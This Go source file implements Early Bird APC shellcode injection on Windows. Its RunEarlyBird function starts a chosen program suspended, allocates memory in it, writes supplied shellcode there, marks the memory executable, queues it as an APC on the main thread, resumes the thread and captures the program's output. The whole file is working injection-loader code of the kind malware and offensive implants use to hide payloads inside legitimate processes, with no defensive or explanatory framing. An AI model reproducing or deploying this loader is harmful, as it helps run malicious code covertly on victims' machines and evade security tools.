package utils

import (
	"fmt"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)


var (
	KERNEL32DLL        = syscall.NewLazyDLL("kernel32.dll")
	procCreateProcessA = KERNEL32DLL.NewProc("CreateProcessA")
	procQueueUserAPC   = KERNEL32DLL.NewProc("QueueUserAPC")
	VirtualAllocEx = KERNEL32DLL.NewProc("VirtualAllocEx")
	VirtualProtectEx = KERNEL32DLL.NewProc("VirtualProtectEx")
    DebugStop = KERNEL32DLL.NewProc("DebugActiveProcessStop")
)

type (
	BOOL                uint32
	DWORD               uint32
	WORD                uint16
	HANDLE              uintptr
	LPVOID              *uint8
	LPCSTR              *uint8
	LPSTR               *uint8
	LPBYTE              *uint8
	SECURITY_ATTRIBUTES struct {
		nLength              DWORD
		lpSecurityDescriptor LPVOID
		bInheritHandle       BOOL
	}
)

type (
	LPSECURITY_ATTRIBUTES *SECURITY_ATTRIBUTES
	STARTUPINFOA          struct {
		Cb              DWORD
		LpReserved      LPSTR
		LpDesktop       LPSTR
		LpTitle         LPSTR
		DwX             DWORD
		DwY             DWORD
		DwXSize         DWORD
		DwYSize         DWORD
		DwXCountChars   DWORD
		DwYCountChars   DWORD
		DwFillAttribute DWORD
		DwFlags         DWORD
		WShowWindow     WORD
		CbReserved2     WORD
		LpReserved2     LPBYTE
		HStdInput       HANDLE
		HStdOutput      HANDLE
		HStdError       HANDLE
	}
)

type (
	LPSTARTUPINFOA      *STARTUPINFOA
	PROCESS_INFORMATION struct {
		HProcess    HANDLE
		HThread     HANDLE
		DwProcessId DWORD
		DwThreadId  DWORD
	}
)
type LPPROCESS_INFORMATION *PROCESS_INFORMATION

type (
	PAPCFUNC  uintptr
	ULONG_PTR uint32
)

func CreateProcessA(lpApplicationName LPCSTR, lpCommandLine LPSTR, lpProcessAttributes LPSECURITY_ATTRIBUTES, lpThreadAttributes LPSECURITY_ATTRIBUTES, bInheritHandles BOOL, dwCreationFlags DWORD, lpEnvironment LPVOID, lpCurrentDirectory LPCSTR, lpStartupInfo LPSTARTUPINFOA) (lpProcessInformation LPPROCESS_INFORMATION, err error) {
	var pi PROCESS_INFORMATION = PROCESS_INFORMATION{}

	_, _, e := syscall.SyscallN(procCreateProcessA.Addr(), uintptr(unsafe.Pointer(lpApplicationName)), uintptr(unsafe.Pointer(lpCommandLine)), uintptr(unsafe.Pointer(lpProcessAttributes)), uintptr(unsafe.Pointer(lpThreadAttributes)), uintptr(0), uintptr(dwCreationFlags), uintptr(unsafe.Pointer(lpEnvironment)), uintptr(unsafe.Pointer(lpCurrentDirectory)), uintptr(unsafe.Pointer(lpStartupInfo)), uintptr(unsafe.Pointer(&pi)))

	return &pi, e
}

func QueueUserAPC(pfnAPC PAPCFUNC, hThread HANDLE, dwData ULONG_PTR) (res DWORD, err error) {
	r, _, e := syscall.SyscallN(procQueueUserAPC.Addr(), (uintptr)(pfnAPC), uintptr(hThread), 0)

	return DWORD(uint32(r)), e
}

func DebugActiveProcessStop(dwProcessId DWORD) (res BOOL, err error) {
    r, _, e := syscall.SyscallN(DebugStop.Addr(), uintptr(dwProcessId))
    return BOOL(r), e
    
}
func ResumeThread(hThread windows.Handle) (e error) {
	_, _, e = KERNEL32DLL.NewProc("ResumeThread").Call(uintptr(hThread))
	return e
}

func RunEarlyBird(shellcode []byte, pathSpawnedProc string) (stdout []byte, stderr []byte, err error) {
    // Create inheritable pipes using Windows API
    var stdoutRead, stdoutWrite, stderrRead, stderrWrite windows.Handle
    sa := &windows.SecurityAttributes{
        Length:        uint32(unsafe.Sizeof(windows.SecurityAttributes{})),
        InheritHandle: 1, // Make handles inheritable
    }

    // Create stdout pipe
    if err := windows.CreatePipe(&stdoutRead, &stdoutWrite, sa, 0); err != nil {
        return nil, nil, fmt.Errorf("stdout pipe creation failed: %w", err)
    }
    defer windows.CloseHandle(stdoutRead)
    defer windows.CloseHandle(stdoutWrite)

    // Create stderr pipe
    if err := windows.CreatePipe(&stderrRead, &stderrWrite, sa, 0); err != nil {
        return nil, nil, fmt.Errorf("stderr pipe creation failed: %w", err)
    }
    defer windows.CloseHandle(stderrRead)
    defer windows.CloseHandle(stderrWrite)

    // Prevent read handles from being inherited
    if err := windows.SetHandleInformation(stdoutRead, windows.HANDLE_FLAG_INHERIT, 0); err != nil {
        return nil, nil, fmt.Errorf("failed to set stdout read handle: %w", err)
    }
    if err := windows.SetHandleInformation(stderrRead, windows.HANDLE_FLAG_INHERIT, 0); err != nil {
        return nil, nil, fmt.Errorf("failed to set stderr read handle: %w", err)
    }

    // Setup process creation
    lpCommandLine, err := windows.UTF16PtrFromString(pathSpawnedProc)
    if err != nil {
        return nil, nil, fmt.Errorf("command line conversion failed: %w", err)
    }

    // Get standard input handle
    hStdin, _ := windows.GetStdHandle(windows.STD_INPUT_HANDLE)

    si := windows.StartupInfo{
        Flags:     windows.STARTF_USESTDHANDLES,
        StdInput:  hStdin,
        StdOutput: stdoutWrite,
        StdErr:    stderrWrite,
    }

    var pi windows.ProcessInformation
    err = windows.CreateProcess(
        nil,
        lpCommandLine,
        nil,
        nil,
        true, // Inherit handles
        windows.CREATE_SUSPENDED,
        nil,
        nil,
        &si,
        &pi,
    )
    if err != nil {
        return nil, nil, fmt.Errorf("process creation failed: %w", err)
    }
    defer windows.CloseHandle(pi.Process)
    defer windows.CloseHandle(pi.Thread)

    // Close write ends in PARENT process
    windows.CloseHandle(stdoutWrite)
    windows.CloseHandle(stderrWrite)

    // --- Memory manipulation and APC injection remains the same ---
    // [Your existing shellcode injection code here]
    pShellCodeAddress, _, err := VirtualAllocEx.Call(uintptr(pi.Process), 0, uintptr(len(shellcode)), windows.MEM_COMMIT | windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil && err.Error() != "The operation completed successfully." {
		fmt.Println("Failed to VirtuAllocEx")
		fmt.Println(err)
	}

	var numByteWritten uintptr
	err = windows.WriteProcessMemory(windows.Handle(pi.Process), pShellCodeAddress, &(shellcode)[0], uintptr(len(shellcode)), &numByteWritten)
	if err != nil {
		fmt.Println("Failed to Wrtie Process Memory")
		fmt.Println(err)
	}

	var oldProtection uintptr
	_, _, err = VirtualProtectEx.Call(uintptr(pi.Process), pShellCodeAddress, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READWRITE, uintptr(unsafe.Pointer(&oldProtection)))
	if err != nil && err.Error() != "The operation completed successfully." {
		fmt.Println("Failed to Change Process Memory Protection")
		fmt.Println(err)
	}

    _, err = QueueUserAPC(PAPCFUNC(pShellCodeAddress), HANDLE(pi.Thread), 0)
	if err != nil && err.Error() != "The operation completed successfully." {
		fmt.Println("Failed to Start QueueUserAPC")
		fmt.Println(err)
	}


    // Resume thread after injection
    _, err = windows.ResumeThread(pi.Thread)
    if err != nil {
        return nil, nil, fmt.Errorf("resume thread failed: %w", err)
    }

    // Read output after process exits
    stdoutBytes, err := readPipe(stdoutRead)
    if err != nil {
        return nil, nil, fmt.Errorf("stdout read failed: %w", err)
    }

    stderrBytes, err := readPipe(stderrRead)
    if err != nil {
        return nil, nil, fmt.Errorf("stderr read failed: %w", err)
    }

    return stdoutBytes, stderrBytes, nil
}

func readPipe(pipe windows.Handle) ([]byte, error) {
    var data []byte
    buf := make([]byte, 4096)
    for {
        var bytesRead uint32
        err := windows.ReadFile(pipe, buf, &bytesRead, nil)
        if err != nil {
            if err == windows.ERROR_BROKEN_PIPE {
                break
            }
            return nil, err
        }
        if bytesRead > 0 {
            data = append(data, buf[:bytesRead]...)
        }
    }
    return data, nil
}

